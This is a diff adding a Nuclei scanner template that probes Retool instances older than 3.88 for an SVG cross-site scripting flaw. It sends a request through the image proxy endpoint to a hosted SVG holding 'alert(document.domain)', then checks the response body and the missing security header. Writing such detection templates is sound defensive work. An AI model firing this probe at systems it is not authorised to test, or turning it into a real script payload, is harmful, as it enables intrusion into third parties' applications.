@@ -1,0 +1,44 @@
+id: retool-svg-xss
+
+info:
+  name: Retool < 3.88 - SVG Cross-Site Scripting
+  author: iamnoooob,iamnoooob,pdresearch
+  severity: high
+  description: |
+    This template checks for SVG Cross-Site Scripting(XSS) vulnerability via the Image Proxy URL parameter in Retool.
+  reference:
+    - https://docs.retool.com/releases/edge/3.88#:~:text=Fixed%20an%20SVG%20XSS%20vulnerability%20by%20adding%20a%20CSP.%20(%2349381)
+  classification:
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="x-retool"
+  tags: retool,xss,vuln
+
+http:
+  - raw:
+      - |
+        GET /api/imageProxy?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(document.domain);"
+          - "<?xml version"
+          - '<script type="text/javascript">'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy: default-src 'none';"
+        negative: true
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100c47160445153a1e7e517d5b352149fac6becbf8be85c39c5e89d3a0042c5c658022100e22f6ed99a17f33d892f4ea4206187b9a7c4ba029af438ee4acfd58cadcf5587:922c64590222798bb761d5b6d8e72950
